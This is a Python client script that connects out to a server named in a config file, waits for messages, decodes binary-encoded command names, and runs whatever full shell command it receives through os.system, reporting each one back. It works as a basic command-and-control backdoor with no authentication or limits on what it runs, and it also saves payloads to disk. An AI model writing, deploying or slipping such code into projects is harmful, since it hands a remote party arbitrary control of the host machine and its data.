import configparser
import os
import socket
import subprocess

ClientMultiSocket = socket.socket()

config_obj = configparser.ConfigParser()
config_obj.read("common/configfile.ini")
socket_info = config_obj["configuration"]
host = str(socket_info["host"])
port = int(socket_info["port"])
directory = socket_info["directory"]

try:
    ClientMultiSocket.connect((host, port))
    print('new client started!')
except socket.error as e:
    print(str(e))
res = ClientMultiSocket.recv(1024)


def convert_to_binary(binary_string):
    chunks = [binary_string[i:i + 8] for i in range(0, len(binary_string), 8)]
    return "".join([chr(int(binary, 2)) for binary in chunks])


def save_payload_in_dir(massage_num, payload):
    if not os.path.isdir(directory):
        os.makedirs(directory)
    file_name = directory + "\maessage_" + str(massage_num) + "_payload"
    text_file = open(file_name, "w+")
    text_file.write(payload)
    text_file.close()

def handle_shell_command(command_parts):
    # for example: "01100101011000110110100001101111" is "echo"
    save_payload_in_dir(command_parts[0], command_parts[4])
    ascii_string = convert_to_binary(command_parts[4])
    shell_command = ascii_string
    for i in range(5, len(command_parts)):
        shell_command += " " + command_parts[i]
    os.system(shell_command)
    # os.system('echo hello')
    ClientMultiSocket.send(str.encode("Successfully executed. Command identifier: " + command_parts[0]))


while True:
    res = ClientMultiSocket.recv(1024)
    command = res.decode('utf-8')
    if command == "kill":
        ClientMultiSocket.close()
        break
    else:
        #command is type message command
        command_parts = command.split()
        ClientMultiSocket.send(str.encode("Recived message. Command identifier: " + command_parts[0]))
        if command_parts[3] == "shell":
            handle_shell_command(command_parts)
